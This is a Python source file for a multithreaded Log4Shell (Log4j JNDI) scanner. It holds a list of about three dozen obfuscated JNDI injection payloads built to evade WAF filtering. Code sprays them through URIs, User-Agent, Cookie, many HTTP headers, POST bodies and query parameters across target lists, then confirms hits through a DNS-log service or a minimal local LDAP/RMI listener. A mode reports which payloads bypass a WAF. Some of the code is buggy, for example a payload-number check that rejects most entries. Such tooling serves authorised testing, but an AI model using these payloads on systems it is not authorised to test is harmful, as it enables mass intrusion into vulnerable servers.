import re
import time
import socket
import codecs
import getopt
import requests
import warnings
import threading
import multiprocessing
from modules.log import logErr

warnings.filterwarnings("ignore")

helper = '''
Scan Options:
    -t <target>, --target <target>
    \ttarget to scan.
    -f <file path>, --file <file path>
    \ttargets file path.
    -j <num>, --jndipayload <num>
    \tUsed payload, can be list by option -l.
    -L <ip:port>, --local <ip:port>
    \tRun local jndi server to record the request, but the public IP is essential.
    -p <protocol://ip:port>, --proxy <protocol://ip:port>
    \tUse proxy
    -h, --help
    \tShow help
    -w, --waf
    \tVerify the effectiveness of WAF rules about Log4j. This mode only support options with -t, -p.
    -l, --list
    \tList all payload can use.
    -n <dnslog.domain>
    \tIt will use the dnslog.domain as the part of payload, and it will not to monitoring the dnslog server.
'''
# global variable
default_payload = '${${lower:${::::::::::-j}${upper:n}${lower:d}${upper:i}:${lower:l}${::::::::::-d}${lower:a}${' \
                  '::::::::::-p}://payload_id.ns.dnslog.domain/status}} '
base_payload = ""

# default proxy is None
proxies = {}

payloads = {
    "1": r'${jndi:ldap://payload_id.ns.dnslog.domain/status}',
    "2": r'${jndi:${lower:LDAP}://payload_id.ns.dnslog.domain/TomcatBypass/status}',
    "3": r'${${sys:sun.cpu.isalist}jndi:${lower:LDAP}://payload_id.ns.dnslog.domain/TomcatBypass/status}',
    "4": r'${${lower:${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}${upper:m}${'
         r'lower:i}://payload_id.ns.dnslog.domain/status}}',
    "5": r'${${lower:${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}${upper:d}${lower:a}${'
         r'lower:p}://payload_id.ns.dnslog.domain/status}}',
    "6": r'${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://payload_id.ns.dnslog.domain/status}',
    "7": r'${${::-j}ndi:rmi://payload_id.ns.dnslog.domain/status}',
    "8": r'${jndi:rmi://payload_id.ns.dnslog.domain/status}',
    "9": r'${${lower:jndi}:${lower:rmi}://payload_id.ns.dnslog.domain/status}',
    "10": r'${${lower:${lower:jndi}}:${lower:rmi}://payload_id.ns.dnslog.domain/status}',
    "11": r'${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://payload_id.ns.dnslog.domain/status}',
    "12": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${'
          r'sys:sun.cpu.isalist}:${lower:LDAP}://payload_id.ns.dnslog.domain/status}',
    "13": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${'
          r'sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}://payload_id.ns.dnslog.domain/TomcatBypass/status}',
    "14": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${'
          r'sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${'
          r'sys:file.separator}payload_id.ns.dnslog.domain/status}',
    "15": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${'
          r'sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${'
          r'sys:file.separator}payload_id.ns.dnslog.domain${sys:file.separator}status}',
    "16": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${'
          r'sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${'
          r'sys:file.separator}payload_id${sys:sun.cpu.isalist}.ns.dnslog.domain${sys:sun.cpu.isalist}${'
          r'sys:file.separator}status}',
    "17": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${'
          r'sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${'
          r'sys:file.separator}payload_id${sys:sun.cpu.isalist}.ns.dnslog.domain${sys:sun.cpu.isalist}${'
          r'sys:file.separator}status}',
    "18": r'${jndi:${lower:RMI}://payload_id.ns.dnslog.domain/TomcatBypass/status}',
    "19": r'${${sys:sun.cpu.isalist}jndi:${lower:RMI}://payload_id.ns.dnslog.domain/TomcatBypass/status}',
    "22": r'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://payload_id.ns.dnslog.domain/status}',
    "23": r'${${::-j}ndi:ldap://payload_id.ns.dnslog.domain/status}',
    "25": r'${${lower:jndi}:${lower:rmi}://payload_id.ns.dnslog.domain/status}',
    "26": r'${${lower:${lower:jndi}}:${lower:ldap}://payload_id.ns.dnslog.domain/status}',
    "27": r'${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://payload_id.ns.dnslog.domain/status}',
    "28": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${'
          r'sys:sun.cpu.isalist}:${lower:RMI}://payload_id.ns.dnslog.domain/status}',
    "29": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${'
          r'sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}://payload_id.ns.dnslog.domain/TomcatBypass/status}',
    "30": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${'
          r'sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${'
          r'sys:file.separator}payload_id.ns.dnslog.domain/status}',
    "31": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${'
          r'sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${'
          r'sys:file.separator}payload_id.ns.dnslog.domain${sys:file.separator}status}',
    "32": "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap$ {env:NaN:-:}//payload_id.ns.dnslog.domain/status}",
    "33": "${jn${env::-}di:${::-l}${::-d}${::-a}${::-p}://payload_id.ns.dnslog.domain/status}",
    "34": "${jn${date:}di${date:':'}${::-l}${::-d}${::-a}${::-p}://payload_id.ns.dnslog.domain/status}",
    "35": "${j${k8s:k5:-ND}i${sd:k5:-:}${::-l}${::-d}${::-a}${::-p}://payload_id.ns.dnslog.domain/status}",
    "36": "${j${main:k5:-Nd}i${spring:k5:-:}${::-l}${::-d}${::-a}${::-p}://payload_id.ns.dnslog.domain/status}",
    "37": "${j${sys:k5:-nD }${lower:i${web:k5:-:}}${::-l}${::-d}${::-a}${::-p}://payload_id.ns.dnslog.domain/status}",
    "38": "${j${::-nD}i${::-:}${::-l}${::-d}${::-a}${::-p}://payload_id.ns.dnslog.domain/status}",
    "39": "${j${EnV:K5:-nD}i:${::-l}${::-d}${::-a}${::-p}://payload_id.ns.dnslog.domain/status}",
    "40": "${j${lower:Nd }i${uPper::}${::-l}${::-d}${::-a}${::-p}://payload_id.ns.dnslog.domain/status}"
}


def GeneratePayloadId(url):
    payload_id = url.replace("http://", "").replace("https://", "").split("/")[0].replace(":", '-')
    return payload_id


# get response from dnslog
def CheckDnslog():
    # print(" [+] Getting DNSLog")
    time.sleep(0.5)
    dnslog_url = Log4j.dnslog_api
    headers = eval(Log4j.dnslog_token)
    try:
        response = requests.get(url=dnslog_url, headers=headers)
        try:
            all_msg = eval(response.json()["Msg"])
        except:
            all_msg = response.text
        return all_msg
    except Exception as e:
        logErr(" [CheckDnslogError] " + ", " + e)
    return None


def CheckDnsLogWithTenSecond(payload_ids, log4j_message):
    print("[###] Monitoring the DNSLog [###]")
    start_time = time.time()
    # print(file)
    Log4j.dnslog_api = log4j_message[0]
    Log4j.dnslog_token = log4j_message[1]
    dnsLogDomains = []
    flag = 1
    outfilename = time.strftime('result/dnslog-result-%Y%m%d-%H%M.txt')
    while True:
        all_msg = CheckDnslog()
        if type(all_msg) == type("a"):
            for payload_id in payload_ids:
                if payload_id in all_msg and payload_ids[payload_id] not in dnsLogDomains:
                    print(" [+] Match: " + payload_ids[payload_id])
                    dnsLogDomains.append(payload_ids[payload_id])
            continue
        if not all_msg:
            if flag:
                print(" [-] DNSLog None ...")
                flag = 0
            continue
        for payload_id in payload_ids:
            flag = 1
            for msg in all_msg:
                if payload_id in msg["Subdomain"] and msg["Subdomain"] not in dnsLogDomains:
                    print(" [+] Match: " + payload_ids[payload_id])
                    print("            " + msg["Subdomain"])
                    dnsLogDomains.append(msg["Subdomain"])
                    file = codecs.open(outfilename, 'a+', 'utf-8')
                    file.write(payload_ids[payload_id] + ', ' + msg["Subdomain"] + '\n')
                    file.close()
    return 1


# match the waf intercept feature in response.text
def MatchWaf(response_text):
    if ("Request Rejected" in response_text) or ("incident ID" in response_text) or ("事件 ID" in response_text):
        return True
    return False


# verify the effectiveness of WAF
def VerifyWaf(target):
    try:
        tmp = Log4j()
        for payload_num in payloads:
            Log4j.payload = payloads[payload_num]
            print("[*] Check with payload: " + Log4j.payload)
            tmp.checkVul(target, showWAF=1)
    except Exception as e:
        # print(e)
        logErr(" [VerifyWafError] " + str(e))


def LocalJndiServer(ip, port, payload_ids):
    print("[###] Monitoring the RMI&LDAP Server [###]")
    data_log = b""
    result_log = []
    ldap_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ldap_sock.bind(('0.0.0.0', int(port)))
    ldap_sock.listen(10)
    ldap_sock.settimeout(500)
    # outfilename = time.strftime('result/local-result-%Y%m%d-%H%M.txt')
    # time.sleep(0.5)
    tmp_data2 = b""
    while True:
        try:
            # print(" [*] Checking RMI&LDAP Server")
            ldap_data = b'\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00'
            rmi_data = b'\x4e\x00\x0e\x32\x30\x32\x2e\x31\x30\x34\x2e\x31\x33\x36\x2e\x36\x36\x00\x00\x4d\xab'
            client_sock, remote = ldap_sock.accept()
            client_sock.settimeout(1)
            data1 = client_sock.recv(1024)
            # print(b">> " + data1)
            if b"JRMI" in data1:
                client_sock.send(rmi_data)
            else:
                client_sock.send(ldap_data)
            data2 = b""
            while True:
                try:
                    data2 = data2 + client_sock.recv(1024)
                except:
                    break
            if data2 == tmp_data2:
                client_sock.close()
                continue
            else:
                data_log = data_log + data2
                tmp_data2 = data2
            # print(b">> " + data_log)
            for payload_id in payload_ids:
                # print(payload_id)
                if payload_id.encode() in data_log and payload_id not in result_log:
                    tmp_match = re.findall(b'[-\w\d]*' + payload_id.encode(), data_log)
                    if tmp_match:
                        tmp_match = tmp_match[0]
                    else:
                        tmp_match = "with unknow match"
                    print(" [+] Match: " + payload_ids[payload_id] + ", " + tmp_match.decode())
                    result_log.append(payload_id)
                    client_sock.close()
                    # file = codecs.open(outfilename, 'a+', 'utf-8')
                    # file.write("Local: " + payload_ids[payload_id] + '\n')
                    # file.close()
        except Exception as e:
            print(e)
            logErr("[LocalJndiServerError] " + str(e))
            break
    ldap_sock.close()


# Log4j scanner
class Log4j():
    payload = ""
    proxies = {}
    dnslog_domain = ""
    dnslog_api = ""
    dnslog_token = ""

    def __init__(self):
        1

    @staticmethod
    def CheckCookie(url, payload, showWAF):
        # print("Cookie, " + url)
        try:
            headers = {
                "Cookie": "Mozilla/5.0 %s(Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0" % payload}
            res = requests.get(url, headers=headers, timeout=2, verify=False, proxies=Log4j.proxies)
            if MatchWaf(res.text) and showWAF == 0:
                print(" [-] Rejected by WAF with Cookie payload: " + url)
                return 0
            if showWAF and MatchWaf(res.text) is False:
                print(" [+] Bypass WAF with Cookie payload")
        except Exception as e:
            logErr(" [CheckCookieError] " + url + ", " + str(e))
        return 1

    @staticmethod
    def CheckUserAgent(url, payload, showWAF):
        # print("UA, " + url)
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 %s(Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0" % payload}
            res = requests.get(url, headers=headers, timeout=2, verify=False, proxies=Log4j.proxies)
            if MatchWaf(res.text) and showWAF == 0:
                print(" [-] Rejected by WAF with User-Agent payload: " + url)
                return 0
            if showWAF and MatchWaf(res.text) is False:
                print(" [+] Bypass WAF with User-Agent payload")
        except Exception as e:
            logErr(" [CheckUserAgentError] " + url + ", " + str(e))
        return 1

    @staticmethod
    def CheckHeader(url, payload_id, basePayload, showWAF, encode_mode=0):
        try:
            if encode_mode == 1:
                basePayload = basePayload.replace('{', "%7B").replace("}", "%7D").replace(" ", "+")
            headers = {
                "Host": basePayload.replace("payload_id", "Host-" + payload_id),
                "Origin": basePayload.replace("payload_id", "Origin-" + payload_id),
                "Referer": basePayload.replace("payload_id", "Referer-" + payload_id),
                "Accept": "*/*; " + basePayload.replace("payload_id", "Accept-" + payload_id),
                "Accept-Encoding": "*/*; " + basePayload.replace("payload_id", "Accept-Encoding-" + payload_id),
                "Accept-Language": "zh-CN,zh;q=0.9; " + basePayload.replace("payload_id",
                                                                            "Accept-Language-" + payload_id),
                "Accept-Charset": basePayload.replace("payload_id", "Accept-Charset-" + payload_id),
                "Accept-Datetime": basePayload.replace("payload_id", "Accept-Datetime-" + payload_id),
                "Access-Control-Request-Headers": basePayload.replace("payload_id",
                                                                      "Access-Control-Request-Headers-" + payload_id),
                "Access-Control-Reuqest-Method": basePayload.replace("payload_id",
                                                                     "Access-Control-Reuqest-Method-" + payload_id),
                "A-IM": basePayload.replace("payload_id", "A-IM-" + payload_id),
                "Authorization": basePayload.replace("payload_id", "Authorization-" + payload_id),
                "Cache-Control": basePayload.replace("payload_id", "Cache-Control-" + payload_id),
                "Content-Length": basePayload.replace("payload_id", "Content-Length-" + payload_id),
                "Content-MD5": basePayload.replace("payload_id", "Content-MD5-" + payload_id),
                "Content-Type": basePayload.replace("payload_id", "Content-Type-" + payload_id),
                "Date": basePayload.replace("payload_id", "Date-" + payload_id),
                "DNT": basePayload.replace("payload_id", "DNT-" + payload_id),
                "Expect": basePayload.replace("payload_id", "Expect-" + payload_id),
                "Forwarded": basePayload.replace("payload_id", "Forwarded-" + payload_id),
                "From": basePayload.replace("payload_id", "From-" + payload_id),
                "Front-End-Https": basePayload.replace("payload_id", "Front-End-Https-" + payload_id),
                "Host": basePayload.replace("payload_id", "Host-" + payload_id),
                "HTTP2-Settings": basePayload.replace("payload_id", "HTTP2-Settings-" + payload_id),
                "If-Match": basePayload.replace("payload_id", "If-Match-" + payload_id),
                "If-Modified-Since": basePayload.replace("payload_id", "If-Modified-Since-" + payload_id),
                "If-None-Match": basePayload.replace("payload_id", "If-None-Match-" + payload_id),
                "If-Range": basePayload.replace("payload_id", "If-Range-" + payload_id),
                "If-Unmodified-Since": basePayload.replace("payload_id", "If-Unmodified-Since-" + payload_id),
                "Max-Forwards": basePayload.replace("payload_id", "Max-Forwards-" + payload_id),
                "Origin": basePayload.replace("payload_id", "Origin-" + payload_id),
                "Pragma": basePayload.replace("payload_id", "Pragma-" + payload_id),
                "Proxy-Authorization": basePayload.replace("payload_id", "Proxy-Authorization-" + payload_id),
                "Proxy-Connection": basePayload.replace("payload_id", "Proxy-Connection-" + payload_id),
                "Range": basePayload.replace("payload_id", "Range-" + payload_id),
                "Save-Data": basePayload.replace("payload_id", "Save-Data-" + payload_id),
                "TE": basePayload.replace("payload_id", "TE-" + payload_id),
                "Upgrade": basePayload.replace("payload_id", "Upgrade-" + payload_id),
                "Upgrade-Insecure-Requests": basePayload.replace("payload_id",
                                                                 "Upgrade-Insecure-Requests-" + payload_id),
                "Via": basePayload.replace("payload_id", "Via-" + payload_id),
                "Warning": basePayload.replace("payload_id", "Warning-" + payload_id),
                "X-ATT-DeviceId": basePayload.replace("payload_id", "X-ATT-DeviceId-" + payload_id),
                "X-Correlation-ID": basePayload.replace("payload_id", "X-Correlation-ID-" + payload_id),
                "X-Csrf-Token": basePayload.replace("payload_id", "X-Csrf-Token-" + payload_id),
                "X-Forwarded-For": basePayload.replace("payload_id", "X-Forwarded-For-" + payload_id),
                "X-Forwarded-Host": basePayload.replace("payload_id", "X-Forwarded-Host-" + payload_id),
                "X-Forwarded-Proto": basePayload.replace("payload_id", "X-Forwarded-Proto-" + payload_id),
                "X-Http-Method-Override": basePayload.replace("payload_id", "X-Http-Method-Override-" + payload_id),
                "X-Requested-With": basePayload.replace("payload_id", "X-Requested-With-" + payload_id),
                "X-Requested-ID": basePayload.replace("payload_id", "X-Requested-ID-" + payload_id),
                "X-UIDH": basePayload.replace("payload_id", "X-UIDH-" + payload_id),
                "X-Wap-Profile": basePayload.replace("payload_id", "X-Wap-Profile-" + payload_id)
            }
            # print(headers)
            res = requests.get(url, headers=headers, timeout=2, verify=False, proxies=Log4j.proxies)
            if MatchWaf(res.text) and showWAF == 0:
                print(" [-] Rejected by WAF with Header payload: " + url)
                return 0
            if showWAF and MatchWaf(res.text) is False:
                if encode_mode == 1:
                    print(" [+] Bypass WAF with Header URLEncode payload")
                else:
                    print(" [+] Bypass WAF with Header payload")
        except Exception as e:
            logErr(" [CheckHeaderError] " + url + ", " + str(e))
        return 1

    @staticmethod
    def CheckUri(url, payload, showWAF):
        # print("uri, " + url)
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"}
            if url[-1] == "/":
                url = url[:-1]
            res = requests.get(url + "/" + payload.replace('{', "%7B").replace("}", "%7D"), headers=headers, timeout=2,
                               verify=False, proxies=Log4j.proxies)
            if MatchWaf(res.text) and showWAF == 0:
                print(" [-] Rejected by WAF with URI payload: " + url)
                return 0
            if showWAF and MatchWaf(res.text) is False:
                print(" [+] Bypass WAF with URI payload")
        except Exception as e:
            logErr(" [CheckUriError] " + url + ", " + str(e))
        return 1

    @staticmethod
    def CheckPOST(url, payload, showWAF, encode_mode=0):
        # print("uri, " + url)
        try:
            if encode_mode == 1:
                payload = payload.replace('{', "%7B").replace("}", "%7D").replace(" ", "+")
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"}
            if url[-1] == "/":
                url = url[:-1]
            res = requests.post(url=url, data=payload.replace(" ", ""),
                                headers=headers, timeout=2, verify=False, proxies=Log4j.proxies)
            if MatchWaf(res.text):
                print(" [-] Rejected by WAF with POST payload: " + url)
                return 0
            if showWAF and MatchWaf(res.text) is False:
                if encode_mode == 1:
                    print(" [+] Bypass WAF with POST URLEncode payload")
                else:
                    print(" [+] Bypass WAF with POST payload")
        except Exception as e:
            logErr(" [CheckPOSTError] " + url + ", " + str(e))
        return 1

    @staticmethod
    def CheckRandomParam(url, payload, showWAF):
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"}
            if url[-1] == "/":
                url = url[:-1]
            url = url + "/?a=" + payload.replace('{', "%7B").replace("}", "%7D").replace(" ", "+")
            res = requests.get(url=url, headers=headers, timeout=2, verify=False, proxies=Log4j.proxies)
            if MatchWaf(res.text):
                print(" [-] Rejected by WAF with GET parameter payload: " + url)
                return 0
            if showWAF and MatchWaf(res.text) is False:
                print(" [+] Bypass WAF with GET parameter payload")
        except Exception as e:
            logErr(" [CheckRamdomParamError] " + url + ", " + str(e))
        return 1

    def checkVul(self, url, showWAF=0):
        payload_id = GeneratePayloadId(url)
        # self.id_queue.put(url + "," + payload_id)
        # print(url + "," + payload_id)
        try:
            # raise Exception("111")
            if "http" not in url:
                url_http = "http://" + url
                return self.checkVul(url_http)
                url_https = "https://" + url
                return self.checkVul(url_https)
            else:
                base_payload = Log4j.payload
                # print(base_payload)
                uriPayload = base_payload.replace("payload_id", "uri-" + payload_id)
                UAPayload = base_payload.replace("payload_id", "ua-" + payload_id)
                cookiePayload = base_payload.replace("payload_id", "cookie-" + payload_id)
                postPayload = base_payload.replace("payload_id", "post-" + payload_id)
                paramPayload = base_payload.replace("payload_id", "param-" + payload_id)
                self.CheckUri(url=url, payload=uriPayload, showWAF=showWAF)
                self.CheckUserAgent(url=url, payload=UAPayload, showWAF=showWAF)
                self.CheckCookie(url=url, payload=cookiePayload, showWAF=showWAF)
                self.CheckHeader(url=url, payload_id=payload_id, basePayload=payload_id, showWAF=showWAF)
                self.CheckHeader(url=url, payload_id=payload_id, basePayload=payload_id, showWAF=showWAF, encode_mode=1)
                self.CheckPOST(url=url, payload=postPayload, showWAF=showWAF)
                self.CheckPOST(url=url, payload=postPayload, showWAF=showWAF, encode_mode=1)
                self.CheckRandomParam(url=url, payload=paramPayload, showWAF=showWAF)
            return 1
        except Exception as e:
            logErr(" [CheckVulError] " + url + ", " + str(e))
        return 0


# thread
class Log4jThread(threading.Thread):
    def __init__(self, tmp_queue, id_queue):
        threading.Thread.__init__(self)
        self.queue = tmp_queue
        self.id_queue = id_queue
        self.log4j = Log4j()

    def run(self):
        while True:
            try:
                if len(self.queue) == 0:
                    break
                target = self.queue.pop()
                # print(target)
                a = self.log4j.checkVul(url=target)
            except Exception as e:
                logErr(" [ThreadRunError] " + str(e))
                pass


# thread control
def t_join(m_count, timeout, tmp_queue):
    tmp_count = 0
    i = 0
    while True:
        time.sleep(timeout)
        # print(str(len(tmp_queue))+','+str(threading.activeCount())+','+str(i))
        ac_count = threading.activeCount()
        if ac_count < m_count and ac_count == tmp_count:
            i += 1
        else:
            i = 0
        tmp_count = ac_count
        # print ac_count,queue.qsize()
        if (len(tmp_queue) == 0 and threading.activeCount() <= 1) or i > 5:
            break


def scan(argv):
    try:
        # flag
        global proxies, default_payload, base_payload, helper
        domains = []
        payload_ids = {}
        waf_flag = 0
        local = 0
        ldap_ip = ""
        ldap_port = 0
        no_monitor = 0
        try:
            opts, args = getopt.getopt(argv, "t:f:j:J:m:L:hp:wl:s:n:",
                                       ["target=", "file=", "jndipayload=", "local=", "help", "proxy=", "waf", "list=",
                                        "site=", "mode=", "JndiServer="])
            for opt, arg in opts:
                # print(opt + ":" + arg)
                if opt == '-w' or opt == "--waf":
                    waf_flag = 1
                if opt == '-l' or opt == "--list":
                    for num in payloads:
                        print(" %s: %s\n" % (num, payloads[num]))
                    exit()
                # choose the paylaod
                elif opt == '-j' or opt == "--jndipayload":
                    if 0 < int(arg) < 17:
                        base_payload = payloads[str(arg)]
                    else:
                        raise Exception("input option -j error")
                # scan with proxy
                elif opt == "-p" or opt == "--proxy":
                    if arg in ['-t', '-f', '-j', '-L', '-h', '-p', '-w', '-l', "--target", "--file", "--jndipayload",
                               "--local", "--help", "--proxy", "--waf", "--list"]:
                        raise Exception("No arg of -p(--proxy)")
                    proxies = {"http": arg, "https": arg}
                    Log4j.proxies = proxies
                    print('[+] Run with proxy ' + str(Log4j.proxies))
                # run local server
                elif opt == "-L" or opt == "--local":
                    local = 1
                    ldap_ip, ldap_port = arg.split(":")
                    if re.findall("[^\d^\.]", ldap_ip) or re.findall("[^\d]", ldap_port):
                        raise Exception("Error format of ldap server.")
                # a single target
                elif opt == '-t' or opt == '--target':
                    domains.append(arg)
                    # print(arg)
                    payload_ids[GeneratePayloadId(arg)] = arg
                # read the target from file
                elif opt == '-f' or opt == '--file':
                    print("loading from file " + arg)
                    targets = codecs.open(arg, 'r', 'utf-8').read().replace('\r', '').replace('\t', '').replace(" ",
                                                                                                                "").split(
                        '\n')
                    for target in targets:
                        if target == "":
                            continue
                        else:
                            payload_ids[GeneratePayloadId(target)] = target
                            domains.append(target)
                elif opt == '-n':
                    print("[*] Will not monitoring the dnslog server and using the dnslog.conf")
                    Log4j.dnslog_domain = arg
                    no_monitor = 1
            # handle the opt -j which can choose the payload to use.
            if base_payload == "":
                base_payload = default_payload
                # the payload of local is different from dnslog, because the site of target_id will be display on differect localtion in URL.
                if local == 1:
                    base_payload = default_payload.replace("ns.dnslog.domain", str(ldap_ip) + ":" + str(ldap_port))
                    base_payload = base_payload.replace("payload_id.", "").replace("status", "payload_id")
                Log4j.payload = base_payload.replace("ns.dnslog.domain", Log4j.dnslog_domain)
                print('[+] Using default payload: ' + Log4j.payload)
            else:
                if local == 1:
                    base_payload = base_payload.replace("ns.dnslog.domain", str(ldap_ip) + ":" + str(ldap_port))
                    base_payload = base_payload.replace("payload_id.", "").replace("status", "payload_id")
                Log4j.payload = base_payload.replace("ns.dnslog.domain", Log4j.dnslog_domain)
                print('[+] Using payload: ' + Log4j.payload)
            if waf_flag == 1:
                # print("[+] WAF verify can only support the parameter with -t and -w")
                print(str(domains))
                VerifyWaf(domains[0])
                exit()
        except Exception as e:
            print(e)
            logErr(" [GetArgsError] " + str(e))
            exit()
        print("[+] Load Target(s): " + str(len(domains)))
        # exit()

        # multiprocess to receive the request from targets
        id_queue = multiprocessing.Queue()
        if local and no_monitor == 0:
            print('[+] Run at local RMI&LDAP Server.')
            p = multiprocessing.Process(target=LocalJndiServer, args=(ldap_ip, int(ldap_port), payload_ids,))
            p.start()
        else:
            if  no_monitor == 0:
                print('[+] Run at remote DNSLog Server.')
                Log4j_message = [Log4j.dnslog_api, Log4j.dnslog_token]
                p = multiprocessing.Process(target=CheckDnsLogWithTenSecond, args=(payload_ids,Log4j_message, ))
                p.start()

        print("[+] Running threading process.")
        m_count = 20
        if m_count > len(domains):
            m_count = len(domains)
        for i in range(m_count):
            t = Log4jThread(tmp_queue=domains, id_queue=id_queue)
            t.setDaemon(True)
            t.start()
        t_join(m_count=m_count, timeout=5, tmp_queue=domains)
        print(" [+] Complete the threading process.")

        start_time = time.time()
        spendTime = 5
        print(" [+] Server Monitor will be completed after %is." % spendTime)
        while True:
            if (time.time() - start_time) > spendTime:
                break
        if p:
            p.terminate()
    except Exception as e:
        print(e)
        logErr(" [ScanError] " + str(e))
